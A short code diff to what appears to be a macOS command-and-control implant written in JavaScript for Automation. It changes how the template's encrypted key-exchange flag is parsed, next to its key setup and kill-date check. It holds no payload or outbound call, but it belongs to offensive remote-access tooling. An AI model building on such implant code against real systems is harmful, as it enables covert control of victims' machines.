@@ -55,7 +55,7 @@ class customC2 extends baseC2{
             let err = Ref();
             this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
 		}
-        this.using_key_exchange = "encrypted_exchange_check" === "T";
+        this.using_key_exchange = "encrypted_exchange_check" === "true";
 		this.exchanging_keys = this.using_key_exchange;
 		if("killdate" !== "yyyy-mm-dd" && "killdate" !== ""){
 			this.dateFormatter = $.NSDateFormatter.alloc.init;
